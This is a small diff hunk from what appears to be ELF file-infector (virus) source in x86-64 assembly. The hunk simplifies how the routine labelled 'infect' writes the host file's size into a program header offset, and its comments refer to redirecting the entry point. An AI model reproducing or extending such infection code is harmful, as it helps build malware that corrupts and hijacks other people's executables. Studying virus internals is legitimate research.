@@ -203,8 +203,8 @@ infect:
     mov [rsi + 4], eax
 
     ; Change the offset to the end
-    xor rax, rax        ; p_offset is twice as big so we'll use rax
-    or rax, [file_size]
+    ; p_offset is twice as big so we'll use rax
+    mov rax, [file_size]
     mov [rsi + 8], rax
 
     ; Change the entry point to somewhere very far
